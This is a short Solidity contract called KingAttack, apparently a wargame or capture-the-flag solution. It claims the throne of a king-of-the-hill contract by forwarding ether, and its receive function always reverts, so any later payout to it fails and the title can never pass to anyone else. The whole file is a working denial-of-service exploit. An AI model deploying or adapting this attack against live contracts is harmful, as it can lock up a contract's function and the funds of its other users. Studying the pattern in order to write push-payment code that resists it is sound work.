// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    function become_king(address king) public payable {
        (bool success,) = payable(king).call{value: msg.value}("");
        if (!success) {
            revert("send eth error");
        }
    }

    receive() external payable {
        revert("Error");
    }
}
